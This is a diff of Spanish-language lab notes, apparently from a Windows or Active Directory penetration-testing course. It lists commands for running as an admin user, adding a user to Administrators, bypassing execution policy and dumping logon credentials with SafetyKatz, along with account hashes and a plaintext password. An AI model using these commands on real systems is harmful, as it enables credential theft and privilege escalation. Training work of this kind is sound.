@@ -20,7 +20,7 @@ P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
 - [ ] `runas.exe /user:studentadmin cmd`
 - [ ] `whoami`
 - [ ] `hostname`
-
+P@ssS3cretforuservirtualmachineAdm!nthatitisnotguessable!
 ### Añadir usuario al grupo Administrators
 - [ ] `net localgroup Administrators TECH\studentuser /add`
 - [ ] `net localgroup Administrators`
@@ -48,8 +48,8 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
 - [ ] `SafetyKatz.exe "privilege::debug" "token::elevate" "sekurlsa::evasive-logonPasswords" "exit"`
 ![[Pasted image 20260727164436.png]]
 
-studvm$  -> 95dad9bc92763efe74968c2fcccc3b61 
-studentuser -> 686079be7b2a8fae60d502ddc416b2e0 
+studvm$  -> 76a995e2ff185255fec109df0f7448b8 
+studentuser -> 733a816e09ea7d0228a63cb2bc81561b 
 studentadmin -> 97daeac345542c952eea4446471ca158 
 
 
